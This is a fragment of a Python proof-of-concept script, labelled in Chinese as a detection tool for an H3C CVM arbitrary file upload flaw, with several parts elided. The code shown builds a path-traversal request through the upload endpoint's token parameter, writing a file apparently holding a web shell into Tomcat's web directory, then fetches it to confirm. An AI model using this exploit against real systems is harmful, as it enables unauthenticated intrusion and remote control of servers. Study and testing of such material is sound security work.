...
def poc(target):
    ...
    payload = '/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{0}&name=222'.format(
        filename)
    timeout = 5
    headers = {
    ...
    data = '{0}'.format(shell)
    verify_url = urllib.parse.urljoin(target, '/cas/js/lib/buttons/' + filename)
    try:
...
def main():
    parser = argparse.ArgumentParser("H3C CVM 前台任意文件上传漏洞检测POC")
